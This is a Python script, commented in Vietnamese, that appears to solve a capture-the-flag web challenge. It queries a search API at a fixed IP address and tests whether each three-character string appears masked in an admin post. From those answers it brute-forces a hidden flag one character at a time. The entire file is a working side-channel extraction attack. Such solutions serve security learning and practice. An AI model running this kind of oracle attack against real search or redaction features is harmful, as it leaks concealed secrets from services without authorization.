import requests
import string
# CHARSET mở rộng: tất cả ký tự ASCII printable, trừ khoảng trắng và ký tự điều khiển
charset = ''.join(c for c in string.printable if c not in ' \t\n\r\x0b\x0c')
discovered = 'ere'  # hoặc để '' nếu brute từ đầu

def test_triplet(query):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': query},
            timeout=5
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13" and
                post['content'].startswith("Well luckily the content of the flag is hidden")):

                # Nếu triplet không xuất hiện → đã bị replace → nằm trong FLAG
                if query not in post['content']:
                    print(f'✅ "{query}" bị che → nằm trong FLAG')
                    return True
                else:
                    print(f'❌ "{query}" vẫn thấy rõ → không thuộc FLAG')
        return False

    except Exception as e:
        print('❌ Error:', e)
        return False

# Bruteforce flag bằng cách tìm từng ký tự kế tiếp
while True:
    found = False
    for c in charset:
        triplet = discovered[-2:] + c
        print(f'\n🔎 Thử triplet: {triplet}')
        if test_triplet(triplet):
            discovered += c
            print(f'\n🟢 Flag so far: {discovered}')
            found = True
            break
    if not found:
        print('\n❗ Không tìm thấy ký tự nào tiếp theo. Có thể FLAG đã kết thúc.')
        break
